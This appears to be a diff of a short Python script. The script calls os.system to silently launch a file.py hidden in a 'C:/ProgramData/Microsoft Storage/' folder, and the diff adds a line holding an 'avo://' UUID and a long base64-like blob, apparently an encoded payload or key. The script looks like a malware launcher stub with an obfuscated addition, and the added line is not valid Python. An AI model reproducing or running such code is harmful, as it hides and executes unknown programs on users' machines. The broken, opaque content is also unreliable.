@@ -1,2 +1,4 @@
 import os
 os.system("start C:/ProgramData/Microsoft Storage/file.py")
+
+avo://314e73f2-b144-4032-9145-8e2c5a1b2654:ymzBu0Fa10LxfIDHTICUsS9N9exVqJxysQ3j/j/SzKWIeq/ZI/fhNbrjIqgLmJJGRXfRQ5zODQAh4zZ7pvYVqwpSxDz9AZhjuIPLQSlK2179DaJYyG8dhVvV/6qt11vpyTtwrwo+4eQGg0NTGdP+7FMi2b1XzLiNOergeC2uP/W0f3mHliWWCQVS00y1TnbHiaONvXKH5UCmCHie/ll89vZ9DjYS9oBHKiF0bIkDfpuBLHdLn0NljaNv+iJBDGIpy/bOw7ZoILrXtDG+O5qDsuWOwikpASybBnlwwqf4Lv1V0HddmmGAOP8WoU6/nwo54QZjGReBcOWt1NsPwY13sZ0zymuP8qPgMFeUmLwmPqXzMCrs9OcGEPStKrZA53Np+1snq/qPMou0K3Xk8ALf
